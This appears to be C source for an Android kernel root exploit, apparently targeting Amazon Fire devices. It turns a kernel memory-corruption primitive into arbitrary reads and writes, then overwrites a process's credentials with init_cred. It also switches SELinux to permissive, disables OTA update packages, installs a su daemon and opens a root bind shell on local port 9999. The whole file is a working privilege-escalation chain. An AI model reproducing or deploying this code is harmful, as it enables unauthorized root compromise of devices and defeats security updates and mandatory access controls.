#include "common.h"
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/system_properties.h>
#include <poll.h>

#ifdef ROOT_CHAIN

#define ROOT_CHILD_COMM "ionroot!"
#define ROOT_PROOF "/data/local/tmp/ghostlock.proof"
#define SHELL_RC "/data/local/tmp/.surc"
#define WALK_MAX 64

pid_t g_root_child = -1;
#define SLOT_STRIDE 0x20ULL
#define SLOT_COUNT  32
static int g_slot = 0;
static int slot_left(void) { return SLOT_COUNT - g_slot; }

enum { EXP_W_TREE_PC = 0, EXP_W_TREE_RIGHT, EXP_W_TREE_LEFT,
       EXP_W_PI_TREE_PC, EXP_W_PI_TREE_RIGHT, EXP_W_PI_TREE_LEFT,
       EXP_W_TASK, EXP_W_LOCK, EXP_W_PI_PRIO, EXP_W_PI_DEADLINE };

static int hexv(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

static void read_bootid(char *out, size_t n) {
  read_first_line("/proc/sys/kernel/random/boot_id", out, n);
}

static int bootid_bytes(unsigned char *o16) {
  char b[64]; read_bootid(b, sizeof(b));
  int nib = -1, k = 0;
  for (size_t i = 0; b[i] && k < 16; i++) {
    int v = hexv(b[i]); if (v < 0) continue;
    if (nib < 0) { nib = v; continue; }
    o16[k++] = (unsigned char)((nib << 4) | v); nib = -1;
  }
  return k == 16;
}

static int stamp_once(uint64_t pc, uint64_t target) {
  if (g_slot >= SLOT_COUNT) return 0;
  uint64_t buf[16];
  memset(buf, 0, sizeof(buf));
  buf[EXP_W_TREE_PC]    = pc;
  buf[EXP_W_TREE_RIGHT] = 0;
  buf[EXP_W_TREE_LEFT]  = target;
  buf[EXP_W_TASK]       = kaslr_image_addr(INIT_TASK);
  buf[EXP_W_LOCK]       = kaslr_image_addr(PANIC_SCRATCH) + (uint64_t)(g_slot++) * SLOT_STRIDE;
  exp_stack_once(buf);
  return 1;
}

static int root_read16(uint64_t addr, unsigned char *out16) {
  uint64_t bd = kaslr_image_addr(BOOTID_DATA);
  while (slot_left() > 0) {
    if (!stamp_once(addr, bd)) break;
    unsigned char r[16];
    if (!bootid_bytes(r)) continue;
    uint64_t hi = 0;
    for (int i = 0; i < 8; i++) hi |= (uint64_t)r[8 + i] << (i * 8);
    if (hi == bd) { memcpy(out16, r, 16); return 1; }
  }
  return 0;
}

static uint64_t root_read64(uint64_t addr) {
  unsigned char r[16];
  if (!root_read16(addr, r)) return 0;
  uint64_t v = 0; for (int i = 0; i < 8; i++) v |= (uint64_t)r[i] << (i * 8);
  return v;
}

static int root_write(uint64_t pc, uint64_t target) { return stamp_once(pc, target); }

static int root_write_verify(uint64_t pc, uint64_t target) {
  uint64_t want = pc & ~3ULL;
  while (slot_left() >= 2) {
    if (!stamp_once(pc, target)) break;
    uint64_t got = root_read64(target);
    if (got == want) return 1;
  }
  return 0;
}

static int rc_kptr(uint64_t v) { return (v >> 48) == 0xffff && (v & 7) == 0; }

static int child_uid(void) {
  char path[64], buf[2048];
  if (g_root_child <= 0) return -1;
  snprintf(path, sizeof(path), "/proc/%d/status", (int)g_root_child);
  int fd = open(path, O_RDONLY | O_CLOEXEC); if (fd < 0) return -1;
  ssize_t n = read(fd, buf, sizeof(buf) - 1); close(fd);
  if (n <= 0) return -1; buf[n] = 0;
  char *p = strstr(buf, "Uid:"); return p ? (int)strtol(p + 4, NULL, 10) : -1;
}

static void write_shell_rc(void) {
  char dev[PROP_VALUE_MAX];
  if (__system_property_get("ro.product.device", dev) <= 0) {
    snprintf(dev, sizeof(dev), "android");
  }
  int fd = open(SHELL_RC, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
  if (fd < 0) return;
  dprintf(fd,
          "[ -f /system/etc/mkshrc ] && . /system/etc/mkshrc\n"
          "PS1='root@%s:${PWD:-?} # '\n",
          dev);
  close(fd);
  chmod(SHELL_RC, 0644);
}

static void set_shell_ctx(void) {
  static const char ctx[] = "u:r:shell:s0";
  int fd = open("/proc/self/attr/current", O_WRONLY | O_CLOEXEC);
  if (fd < 0) return;
  ssize_t n = write(fd, ctx, sizeof(ctx) - 1);
  if (n < 0) {
    char buf[64];
    int len = snprintf(buf, sizeof(buf), "%s\n", ctx);
    lseek(fd, 0, SEEK_SET);
    n = write(fd, buf, (size_t)len);
  }
  (void)n;
  close(fd);
}

static int open_pty_master(char *slave, size_t slave_len) {
  int master = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master < 0) return -1;
  if (grantpt(master) != 0 || unlockpt(master) != 0) { close(master); return -1; }
  if (ptsname_r(master, slave, slave_len) != 0) { close(master); return -1; }
  struct winsize ws = { .ws_row = 24, .ws_col = 80 };
  ioctl(master, TIOCSWINSZ, &ws);
  return master;
}

static void pump_pty(int sock, int master) {
  char buf[4096];
  for (;;) {
    struct pollfd p[2];
    p[0].fd = sock; p[0].events = POLLIN; p[0].revents = 0;
    p[1].fd = master; p[1].events = POLLIN; p[1].revents = 0;
    if (poll(p, 2, -1) < 0) {
      if (errno == EINTR) continue;
      return;
    }
    if (p[0].revents & POLLIN) {
      ssize_t n = read(sock, buf, sizeof(buf));
      if (n <= 0) return;
      if (write(master, buf, (size_t)n) < 0) return;
    }
    if (p[1].revents & POLLIN) {
      ssize_t n = read(master, buf, sizeof(buf));
      if (n <= 0) return;
      if (write(sock, buf, (size_t)n) < 0) return;
    }
    if ((p[0].revents | p[1].revents) & (POLLHUP | POLLERR | POLLNVAL)) return;
  }
}

static void serve_bind_client(int cs) {
  char slave_name[128];
  int master = open_pty_master(slave_name, sizeof(slave_name));
  if (master < 0) {
    setresgid(0, 0, 0);
    setresuid(0, 0, 0);
    dup2(cs, 0); dup2(cs, 1); dup2(cs, 2);
    set_shell_ctx();
    execl("/system/bin/sh", "sh", (char *)NULL);
    _exit(127);
  }

  signal(SIGCHLD, SIG_DFL);
  pid_t pid = fork();
  if (pid == 0) {
    setsid();
    int slave = open(slave_name, O_RDWR | O_NOCTTY);
    if (slave < 0) _exit(126);
    ioctl(slave, TIOCSCTTY, 0);
    setresgid(0, 0, 0);
    setresuid(0, 0, 0);
    dup2(slave, 0); dup2(slave, 1); dup2(slave, 2);
    if (slave > 2) close(slave);
    close(master);
    close(cs);
    setenv("ENV", SHELL_RC, 1);
    setenv("USER", "root", 1);
    setenv("LOGNAME", "root", 1);
    setenv("HOME", "/data/local/tmp", 1);
    setenv("TERM", "xterm-256color", 0);
    set_shell_ctx();
    execl("/system/bin/sh", "sh", "-i", (char *)NULL);
    _exit(127);
  }
  if (pid > 0) {
    pump_pty(cs, master);
    kill(pid, SIGHUP);
    while (waitpid(pid, NULL, 0) < 0 && errno == EINTR) {
    }
  }
  close(master);
}

static int selinux_permissive(void) {
  char v[8]; read_first_line("/sys/fs/selinux/enforce", v, sizeof(v)); return v[0] == '0';
}

static void disable_ota(void) {
  static const char *pkgs[] = {
    "com.amazon.device.software.ota",
    "com.amazon.kindle.otter.oobe.forced.ota",
  };
  for (size_t i = 0; i < sizeof(pkgs) / sizeof(pkgs[0]); i++) {
    pid_t c = fork();
    if (c == 0) {
      int nul = open("/dev/null", O_WRONLY | O_CLOEXEC);
      if (nul >= 0) {
        dup2(nul, STDOUT_FILENO);
        dup2(nul, STDERR_FILENO);
        if (nul > STDERR_FILENO) close(nul);
      }
      setresgid(0, 0, 0);
      setresuid(0, 0, 0);
      set_shell_ctx();
      execl("/system/bin/pm", "pm", "disable", pkgs[i], (char *)NULL);
      _exit(127);
    }
    if (c > 0) {
      int st = 0;
      while (waitpid(c, &st, 0) < 0 && errno == EINTR) {
      }
      int ok = WIFEXITED(st) && WEXITSTATUS(st) == 0;
      pr_info("OTA: %s %s\n", pkgs[i], ok ? "disabled" : "not disabled");
    }
  }
  pid_t s = fork();
  if (s == 0) { execl("/system/bin/sync", "sync", (char *)NULL); _exit(127); }
  if (s > 0) while (waitpid(s, NULL, 0) < 0 && errno == EINTR) {
  }
}

static void root_child_main(void) {
  prctl(PR_SET_NAME, (unsigned long)ROOT_CHILD_COMM, 0, 0, 0);
  for (;;) {
    if (getuid() == 0) {
      char ctx[128] = "unknown";
      read_first_line("/proc/self/attr/current", ctx, sizeof(ctx));
      int fd = open(ROOT_PROOF, O_WRONLY | O_CREAT | O_TRUNC, 0644);
      if (fd >= 0) {
        char m[256];
        int n = snprintf(m, sizeof(m), "ROOTED uid=%u euid=%u context=%s\n",
                         getuid(), geteuid(), ctx);
        write(fd, m, n); close(fd);
        { char *av[] = {"/system/bin/sh", "-c",
            "chown -R 2000:2000 /data/local/tmp 2>/dev/null; "
            "restorecon -R /data/local/tmp 2>/dev/null; "
            "chmod 0666 /data/local/tmp/ghostlock.proof 2>/dev/null", NULL};
          pid_t c = fork();
          if (c == 0) { execv(av[0], av); _exit(1); }
          if (c > 0) waitpid(c, NULL, 0);
        }

        disable_ota();

        { pid_t sud = -1;
          if (install_embedded_su(&sud))
            pr_success("Su daemon ready pid=%d, type su for a root shell\n", sud);
          else
            pr_warning("Su install failed errno=%d, use nc 127.0.0.1 9999\n",
                       errno); }

        int ls = socket(AF_INET, SOCK_STREAM, 0);
        int one = 1; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
        struct sockaddr_in a; memset(&a, 0, sizeof(a));
        a.sin_family = AF_INET; a.sin_port = htons(9999);
        a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (ls >= 0 && bind(ls, (void *)&a, sizeof(a)) == 0 && listen(ls, 4) == 0) {
          write_shell_rc();
          signal(SIGCHLD, SIG_IGN);
          for (;;) {
            int cs = accept(ls, NULL, NULL);
            if (cs < 0) continue;
            if (fork() == 0) {
              close(ls);
              serve_bind_client(cs);
              _exit(0);
            }
            close(cs);
          }
        }
        for (;;) pause();
      }
    }
    usleep(50000);
  }
}

void root_chain_spawn_child(void) {
  pid_t p = fork();
  if (p == 0) { root_child_main(); _exit(0); }
  g_root_child = p;
}
static void spawn_burst(int n) {
  for (int i = 0; i < n; i++) root_chain_spawn_child();
  usleep(40000);
}

static uint64_t find_ionroot(int depth) {
  uint64_t v = root_read64(kaslr_image_addr(INIT_TASK) + TASK_TASKS_OFF + 8);
  if (!rc_kptr(v)) return 0;
  uint64_t cur = v - TASK_TASKS_OFF;
  for (int i = 0; i <= depth && slot_left() >= 6; i++) {
    unsigned char c[16];
    if (!root_read16(cur + TASK_COMM_OFF, c)) return 0;
    if (memcmp(c, ROOT_CHILD_COMM, 8) == 0) {
      pr_success("Root chain: ionroot task %#llx at depth %d\n",
                 (unsigned long long)cur, i);
      return cur;
    }
    uint64_t pv = root_read64(cur + TASK_TASKS_OFF + 8);
    if (!rc_kptr(pv)) return 0;
    cur = pv - TASK_TASKS_OFF;
  }
  return 0;
}

static void selftest(void) {
  uint64_t got = root_read64(kaslr_image_addr(INIT_TASK) + 0x770);
  uint64_t want = kaslr_image_addr(INIT_CRED);
  pr_success("Root chain: SELFTEST *(init_task+0x770)=%#llx want=%#llx %s\n",
             (unsigned long long)got, (unsigned long long)want,
             got == want ? "[READ OK]" : "[READ BROKEN]");
}

static int wait_quiet(void) {
  pid_t last = -1;
  int stable = 0, i = 0, lastdelta = -1;
  for (i = 0; i < 400 && stable < 4; i++) {
    pid_t p = fork();
    if (p == 0) _exit(0);
    if (p > 0) waitpid(p, NULL, 0);
    if (last > 0) lastdelta = (int)(p - last);
    if (last > 0 && lastdelta >= 0 && lastdelta < 12) stable++;
    else stable = 0;
    last = p;
    usleep(300000);
  }
  pr_info("Root chain: fork settle done iters=%d stable=%d delta=%d\n",
          i, stable, lastdelta);
  return stable >= 4;
}

int root_chain_run(void) {
  if (!wait_quiet()) {
    pr_error("Root chain: system never went quiet, abandoning boot, slots left %d\n",
             slot_left());
    return 0;
  }
  uint64_t task = 0;
  for (int t = 0; t < 3 && slot_left() >= 12 && !task; t++) {
    spawn_burst(40);
    int depth = (slot_left() - 8) / 2;
    if (depth > 11) depth = 11;
    if (depth < 4) depth = 4;
    task = find_ionroot(depth);
  }
  if (!task) { pr_error("Root chain: no ionroot near newest, slots left %d\n", slot_left()); return 0; }

  if (!root_write_verify(kaslr_image_addr(INIT_CRED), task + TASK_REAL_CRED_OFF)) {
    pr_error("Root chain: real_cred write did not land, slots left %d\n", slot_left());
    return 0;
  }
  if (!root_write_verify(kaslr_image_addr(INIT_CRED), task + TASK_CRED_OFF)) {
    pr_error("Root chain: cred write did not land, slots left %d\n", slot_left());
    return 0;
  }

  if (slot_left() > 0)
    root_write(kaslr_image_addr(SLIDE_SYSCTL_BOOTID_IMAGE), kaslr_image_addr(BOOTID_DATA));

  uint64_t perm = (kaslr_image_addr(PANIC_SCRATCH) & ~0xffffULL) | 0x10000ULL;
  if (slot_left() > 0)
    root_write(perm, kaslr_image_addr(SELINUX_ENFORCING));
  for (int i = 0; i < 20 && !selinux_permissive(); i++) usleep(100000);

  for (int i = 0; i < 60; i++) {
    if (access(ROOT_PROOF, F_OK) == 0) break;
    usleep(100000);
  }
  return 1;
}

#endif
